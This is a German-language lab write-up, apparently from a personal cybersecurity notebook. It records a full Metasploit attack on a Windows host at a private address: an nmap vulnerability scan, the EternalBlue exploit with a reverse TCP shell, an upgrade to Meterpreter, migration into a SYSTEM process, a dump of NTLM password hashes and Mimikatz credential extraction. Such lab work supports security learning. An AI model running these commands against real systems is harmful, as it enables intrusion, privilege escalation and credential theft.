---
tags: cybersecurity
---


###### stachan 10.03.2021

---

## NMAP

Ein Scan gegen den Webserver:

`nmap -sV -vv --script vuln 192.168.20.250`

Neben Informationen zu offenen Ports gibt diese Abfrage auch Hinweise zu Vulnerabilities und damit verbundenen CVEs: CVE-2017-0143 (ms17-010) ist Eternal Blue.

![](https://i.imgur.com/qpm88Lb.png)


## METASPLOIT

```
msfdb init
msfconsole
db_status
```

Pfad zum Exploitation Code für ms17-010 finden: 

`search ms17`

![](https://i.imgur.com/DHdFAvu.png)


```
use exploit/windows/smb/ms17_010_eternalblue
show options
```

![](https://i.imgur.com/OmV7Q1T.png)


**Exploit ausführen:**

```
set RHOSTS 192.168.20.250
set ForceExploit true
set payload windows/x64/shell/reverse_tcp
exploit
```
Success:

![](https://i.imgur.com/NX9tkit.png)


![](https://i.imgur.com/qllpBMP.png)

`STRG + Z` verschiebt den Task in den Hintergrund.

![](https://i.imgur.com/oyqNGAl.png)


## METERPRETER

```
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
show options
```
Die Option SESSION muss geändert werden.

Aktive Sessions mit `sessions -l`

```
set lport 8080
set session 1
run
```

![](https://i.imgur.com/6uhlyvO.png)

`sessions -i 2`

![](https://i.imgur.com/UP2t4Wt.png)

Shell öffnen  (verlassen mit `exit`): 

![](https://i.imgur.com/XokUgdU.png)


`ps` listet alle Prozesse auf, gesucht wird ein Prozess, der unter `NT-AUTORITÄT\SYSTEM` läuft.

![](https://i.imgur.com/rHTRmpf.png)


Die eigene Session soll mit einer solchen PID eskaliert werden:

`migrate 984` (spoolsv.exe)

Das ist sehr instabil, bei einem Fehlschlag muss ganz von vorne begonnen werden...

![](https://i.imgur.com/52SkpmD.png)

## HASHDUMP

![](https://i.imgur.com/CwuPPSu.png)

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Gast:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
stachan:1000:aad3b435b51404eeaad3b435b51404ee:5b8d7c85ba1d5b3e93ef201047b0af2c:::
```

Diese Hashes können z.B. für eine Pass-the-Hash Attacke weiterverwendet werden.


## KIWI

Mimikatz ist Teil von Metasploit.

In Meterpreter:

```
load kiwi
creds_all
```


## Sophos Firewall

Die Sophos Firewall blockt alles:

![](https://i.imgur.com/jeTNpA3.png)


